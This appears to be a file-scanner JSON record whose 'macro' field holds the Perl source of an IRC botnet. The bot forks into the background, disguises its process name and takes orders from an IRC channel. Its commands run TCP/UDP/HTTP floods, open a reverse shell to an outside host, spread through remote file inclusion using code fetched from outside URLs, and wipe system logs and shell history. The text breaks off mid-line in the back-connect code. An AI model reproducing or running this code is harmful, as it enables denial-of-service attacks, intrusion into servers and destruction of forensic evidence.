{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Put": "May write to a file",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n\n#\n#You can use the following commands :\n#!bot @portscan <ip>\n#!bot @nmap <ip> <beginport> <endport>\n#!bot @back <ip><port>    \n#!bot @udpflood <ip> <packet size> <time>\n#!bot @tcpflood <ip> <port> <packet size> <time>\n#!bot @httpflood <site> <time>\n#!bot @linuxhelp\n#!bot @rfi <vuln> <dork>\n#!bot @system\n#!bot @milw0rm\n#!bot @logcleaner\n#!bot @spread <rfi = for example www.mywebsite.com/index.php?= >\n#!bot @sendmail <subject> <sender> <recipient> <message>\n#!bot @join <#channel>    \n#!bot @part <#channel>\n#!bot @help\n#!bot cd tmp for example\n#!bot !eval <code= for example :@nickname>\n#\n\n######################\nuse HTTP::Request;\nuse LWP::UserAgent;\n######################\nmy $processo = '[httpds]';\n######################\n#####################################################################\n#/!\\                          .:CONFIGURATION:.                  /!\\#\n#####################################################################\n############################################\nmy $linas_max='10';        \nmy $sleep='3';  \n#-----------------                                                         \n#Sleep Time and Max. Lines for Anti Flood  #\n############################################\nmy $cmd=\"http://www.freewebs.com/scar_coder/x2300.txt\";\nmy $id=\"http://www.freewebs.com/scar_coder/id.txt\";\nmy $spread=\"http://www.freewebs.com/scar_coder/id.txt\";\n#-----------------    \n#Spreader, ID=Response, CMD = Print CMD    #\n############################################\nmy @adms=(\"r00t\",\"r00t_\",\"janglebyte\");\n#-----------------                         #\n#Admins of the Bot set your nickname here  #\n############################################\nmy @canais=(\"#2300\");\n#-----------------                         #\n#Put your channel here                     #\n############################################\nmy @nickname = (\"scanbot\");\nmy $nick = $nickname[rand scalar @nickname];\nmy $ircname ='asc-rf1';\nchop (my $realname = 'we r0x');\n#-----------------                         #\n#Identity                                  #\n############################################\n$servidor='irc.zerofuzion.net' unless $servidor;\nmy $porta='6667';\n#-----------------                         #\n#IRCServer and port                        #\n############################################\n#####################################################################\n#/!\\                          .:CONFIGURATION:.                  /!\\#\n#####################################################################\n######################\n#End of Configuration# \n#                    #\n######################\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n\n\n#Connect\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Masalah fork: $!\" unless defined($pid);\n\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n    } else {\n    print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n  my $meunick = $_[0];\n  my $servidor_con = $_[1];\n  my $porta_con = $_[2];\n  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",\n  PeerPort=>$porta_con) or return(1);\n  if (defined($IRC_socket)) {\n    $IRC_cur_socket = $IRC_socket;\n    $IRC_socket->autoflush(1);\n    $sel_cliente->add($IRC_socket);\n    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n    nick(\"$meunick\");\n    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n    sleep 1;\n  }\n}\n\nmy $line_temp;\nwhile( 1 ) {\n  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n  delete($irc_servers{''}) if (defined($irc_servers{''}));\n  my @ready = $sel_cliente->can_read(0);\n  next unless(@ready);\n  foreach $fh (@ready) {\n    $IRC_cur_socket = $fh;\n    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n    $nread = sysread($fh, $msg, 4096);\n    if ($nread == 0) {\n      $sel_cliente->remove($fh);\n      $fh->close;\n      delete($irc_servers{$fh});\n    }\n    @lines = split (/\\n/, $msg);\n    for(my $c=0; $c<= $#lines; $c++) {\n\n      $line = $lines[$c];\n      $line=$line_temp.$line if ($line_temp);\n      $line_temp='';\n      $line =~ s/\\r$//;\n      unless ($c == $#lines) {\n        parse(\"$line\");\n        } else {\n        if ($#lines == 0) {\n          parse(\"$line\");\n          } elsif ($lines[$c] =~ /\\r$/) {\n          parse(\"$line\");\n          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n          parse(\"$line\"); \n                 } else {\n                             $line_temp = $line;\n        }\n      }\n    }\n  }\n}\n\nsub parse {\n  my $servarg = shift;\n  if ($servarg =~ /^PING \\:(.*)/) {\n    sendraw(\"PONG :$1\");\n    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;\n    if ($args =~ /^\\001VERSION\\001$/) {\n           notice(\"$pn\", \"\\001VERSION mIRC v6.17 PitBull\\001\");\n    }\n    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {\n    if ($onde eq \"$meunick\"){\n    shell(\"$pn\", \"$args\");\n  }\n  \n#End of Connect\n\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.% \n######################\n#      PREFIX        #\n#                    #\n######################\n# You can change the prefix if you want but the commands will be different \n# The standard prefix is !bot if you change it into !bitch for example \n# every command will be like !bitch @udpflood, !bitch @googlescan.\n# So its recommended not to change this ;)\n######################\n  \n  if ($args =~ /^(\\Q$meunick\\E|\\!bot)\\s+(.*)/ ) {\n    my $natrix = $1;\n    my $arg = $2;\n    if ($arg =~ /^\\!(.*)/) {\n      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!bot\" and $arg =~ /^\\!nick/);\n      } elsif ($arg =~ /^\\@(.*)/) {\n      $ondep = $onde;\n      $ondep = $pn if $onde eq $meunick;\n      bfunc(\"$ondep\",\"$1\");\n      } else {\n      shell(\"$onde\", \"$arg\");\n    }\n  }\n}\n}\n######################\n#   End of PREFIX    #\n#                    #\n######################\n\nelsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\nif (lc($1) eq lc($meunick)) {\n  $meunick=$4;\n  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n}\n} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\nnick(\"$meunick\".int rand(999999));\n} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n$meunick = $2;\n$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\nforeach my $canal (@canais) {\n  sendraw(\"JOIN $canal ddosit\");\n}\n}\n}\n\nsub bfunc {\nmy $printl = $_[0];\nmy $funcarg = $_[1];\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\n  exit;\n} else {\n\n######################\n#       Help         # \n#                    #\n######################\n\nif ($funcarg =~ /^help/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 Select the function you want help for\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003ddos\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003rfiscan\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003backconnect\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003shell\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003portscanner\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 Or if you want too know all the commands type:\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003commands\");\n\n}\n\nif ($funcarg =~ /^ddos/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 There are 3 DDossers in this bot\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 UDPFlood, HTTPFlood and TCPFlood\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003udpflood <ip> <packet size> <time>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003tcpflood <ip> <port> <packet size> <time>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003httpflood <site> <time>\");\n\n}\n\nif ($funcarg =~ /^rfiscan/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 This bot also contains a RFI Scanner.\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 Commands :\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003rfi <vuln> <dork>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 You can find strings here : http://www.xshqiptaretx.org/strings.txt \");\n\n}\n\nif ($funcarg =~ /^backconnect/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 You use backconnect like this :\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003back <ip><port>\");\n}\n\nif ($funcarg =~ /^shell/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 This bot has a integrated shell\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 You can use it in private but also public in the channel\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 In public channel just use : \u00037!bot cd tmp\u000312 for example\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 For help with the linux commands type :\u0003!bot \u00037@\u0003linuxhelp\");\n}\n\nif ($funcarg =~ /^portscanner/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 There is a normal portscan and a Nmap:\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003portscan <ip>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003nmap <ip> <beginport> <endport>\");\n}\n\nif ($funcarg =~ /^commands/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 You can use the following commands :\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003portscan <ip>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003nmap <ip> <beginport> <endport>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003back <ip><port>\");    \n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u0003cd tmp \u000312 for example\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003udpflood <ip> <packet size> <time>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003tcpflood <ip> <port> <packet size> <time>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003httpflood <site> <time>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003linuxhelp\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003spread <rfi>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003rfi <vuln> <dork>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003system\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003logcleaner\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003sendmail <subject> <sender> <recipient> <message>\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003milw0rm\");    \n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003join #channel\");    \n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Help\u0002\u000312] \u000312 !bot \u00037@\u0003part #channel\");\n}\n\nif ($funcarg =~ /^linuxhelp/) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Dir where you are : pwd\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Start a Perl file : perl file.pl\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Go back from dir : cd ..\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Force to Remove a file/dir : rm -rf file/dir;ls -la\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Show all files/dir with permissions : ls -lia\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Find config.inc.php files : find / -type f -name config.inc.php\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Find all writable folders and files : find / -perm -2 -ls\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Find all .htpasswd files : find / -type f -name .htpasswd\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LiNuX\u0002\u000312] \u000312 - \u000312 Find all service.pwd files : find / -type f -name service.pwd\");\n}\n\n######################\n#   End of  Help     # \n#                    #\n######################\nif ($funcarg =~ /^spread\\s+(.*)/) {\n$vuln = $1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Spread\u0002\u000312] Spreading bot on :\u00034 $vuln\");\nmy $shellurl=\"http://\".$vuln.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$shellurl);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Spread\u0002\u000312] Bot is Spreaded on :\u00034 $vuln\"); \n}\n######################\n#     Commands       # \n#                    #\n######################\n\nif ($funcarg =~ /^system/) {\n$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Info BOT : \u00037 Servidor :Hiden : 6667\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Uname -a     : \u00037 $uname\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Uptime       : \u00037 $uptime\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Own Prosses  : \u00037 $processo\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312ID           : \u00037 $id\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Own Dir      : \u00037 $ownd\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312OS           : \u00037 $distro\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Owner        : \u00037 The_PitBull\");\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003SystemInfo\u0002\u000312] \u000312Channel      : \u00037 #pitbull\");\n}\n\nif ($funcarg =~ /^milw0rm/) {\n    my @ltt=();\n    my @bug=();\n    my $x;\n    my $page=\"\";\n    my $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\n    print $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n    my @r = <$socke>;\n    $page=\"@r\";\n    close($socke);\n    while ($page =~  m/<title>(.*)</g){\n    $x = $1;\n    if ($x =~ /\\&lt\\;/) {\n    $x =~ s/\\&lt\\;/</g;\n    }\n    if ($x !~ /milw0rm/) {\n    push (@bug,$x);\n    }}\n    while ($page =~  m/<link.*expl.*([0-9]...)</g) {\n    if ($1 !~ m/milw0rm.com|exploits|en/){\n    push (@ltt,\"http://www.milw0rm.com/exploits/$1 \");\n    }}\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Milw0rm\u0002\u000312]\u000312 Latest exploits :\u000f\");\n    foreach $x (0..(@ltt - 1)) {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Milw0rm\u0002\u000312]\u000312  $bug[$x] - $ltt[$x]\");\n    sleep 1;\n}}\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#      Portscan      # \n#                    #\n######################\n\nif ($funcarg =~ /^portscan (.*)/) {\n  my $hostip=\"$1\";\n  my\n  @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");\n  my (@aberta, %porta_banner);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Portscan\u0002\u000312]\u000312 Scanning for open ports on \u0003 \u00034\".$1.\"\u0003 \u000312 started \u0003.\");\n  foreach my $porta (@portas)  {\n    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>\n    'tcp', Timeout => 4);\n    if ($scansock) {\n      push (@aberta, $porta);\n      $scansock->close;\n    }\n  }\n  \n  if (@aberta) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Portscan\u0002\u000312]\u000312 Open ports founded:\u0003 @aberta\");\n    } else {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Portscan\u0002\u000312]\u000312 No open ports foundend.\u0003\");\n  }\n}\n\n######################\n#  End of  Portscan  # \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#        Nmap        #  \n#                    #\n######################\n   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){\n         my $hostip=\"$1\";\n         my $portstart = \"$2\";\n         my $portend = \"$3\";\n         my (@abertas, %porta_banner); \n       sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Nmap\u0002\u000312] \u00034: $1 \u000312.:\u00034Ports\u000312:. \u00034 $2-$3\");\n       foreach my $porta ($portstart..$portend){\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); \n    if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 if ($xstats){\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Nmap\u0002\u000312] \u000312Founded \u00034 $porta\".\"/Open\"); \n                 }\n               }\n             }\n             if (@abertas) {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Nmap\u0002\u000312] Complete \");\n             } else {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Nmap\u0002\u000312] No open ports have been founded \u000313\");\n             }\n             }\n######################\n#    End of Nmap     #  \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#    Log Cleaner     #  \n#                    #\n######################\nif ($funcarg =~ /^logcleaner/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LogCleaner\u0002\u000312] This process can be long, just wait\"); \n    system 'rm -rf /var/log/lastlog';\n    system 'rm -rf /var/log/wtmp';\n    system 'rm -rf /etc/wtmp';\n    system 'rm -rf /var/run/utmp';\n    system 'rm -rf /etc/utmp';\n    system 'rm -rf /var/log';\n    system 'rm -rf /var/logs';\n    system 'rm -rf /var/adm';\n    system 'rm -rf /var/apache/log';\n    system 'rm -rf /var/apache/logs';\n    system 'rm -rf /usr/local/apache/log'; \n    system 'rm -rf /usr/local/apache/logs';\n    system 'rm -rf /root/.bash_history';\n    system 'rm -rf /root/.ksh_history';\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LogCleaner\u0002\u000312] All default log and bash_history files erased\"); \n        sleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LogCleaner\u0002\u000312] Now Erasing the rest of the machine log files\");\n    system 'find / -name *.bash_history -exec rm -rf {} \\;';\n    system 'find / -name *.bash_logout -exec rm -rf {} \\;';\n    system 'find / -name \"log*\" -exec rm -rf {} \\;';\n    system 'find / -name *.log -exec rm -rf {} \\;';\n        sleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003LogCleaner\u0002\u000312] Done! All logs erased\"); \n      }\n######################\n# End of Log Cleaner #  \n#                    #\n######################\n# \n# The PitBull !!!!\n#\n######################\n#       MAILER       #  \n#                    #\n######################\n# For mailing use :\n# !bot @sendmail <subject> <sender> <recipient> <message>\n#\n######################\nif ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Mailer\u0002\u000312] Sending Mail to :\u00032 $3\");\n$subject = $1;\n$sender = $2;\n$recipient = $3; \n@corpo = $4;\n$mailtype = \"content-type: text/html\";\n$sendmail = '/usr/sbin/sendmail';\nopen (SENDMAIL, \"| $sendmail -t\");\nprint SENDMAIL \"$mailtype\\n\";\nprint SENDMAIL \"Subject: $subject\\n\"; \nprint SENDMAIL \"From: $sender\\n\";\nprint SENDMAIL \"To: $recipient\\n\\n\";\nprint SENDMAIL \"@corpo\\n\\n\";\nclose (SENDMAIL);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Mailer\u0002\u000312] Mail Sended To :\u00032 $recipient\"); \n}\n######################\n#   End of MAILER    #  \n#                    #\n######################\n######################\n#  Join And Part     # \n#                    #\n######################\n           if ($funcarg =~ /^join (.*)/) {\n              sendraw($IRC_cur_socket, \"JOIN \".$1);\n           }\n           if ($funcarg =~ /^part (.*)/) {\n              sendraw($IRC_cur_socket, \"PART \".$1);\n           }\n           \n######################\n#End of Join And Part# \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#     TCPFlood       # \n#                    #\n######################\n\nif ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003TCP-DDOS\u0002\u000312] Attacking\u0003 \u00034 \".$1.\":\".$2.\" \u000312for \u00034 \".$3.\" \u000312seconds.\u0003\");\n  my $itime = time;\n  my ($cur_time);\n  $cur_time = time - $itime;\n  while ($3>$cur_time){\n  $cur_time = time - $itime;\n  &tcpflooder(\"$1\",\"$2\",\"$3\");\n}\nsendraw($IRC_cur_socket,\"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003TCP-DDOS\u0002\u000312] Attack done\u0003 \u00034 \".$1.\":\".$2.\".\");\n}\n######################\n#  End of TCPFlood   # \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#   Back Connect     # \n#                    #\n######################\nif ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {\nmy $host = \"$1\";\nmy $porta = \"$2\";\nmy $proto = getprotobyname('tcp');\nmy $iaddr = inet_aton($host);\nmy $paddr = sockaddr_in($porta, $iaddr);\nmy $shell = \"/bin/sh -i\";\nif ($^O eq \"MSWin32\") {\n  $shell = \"cmd.exe\";\n}\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die 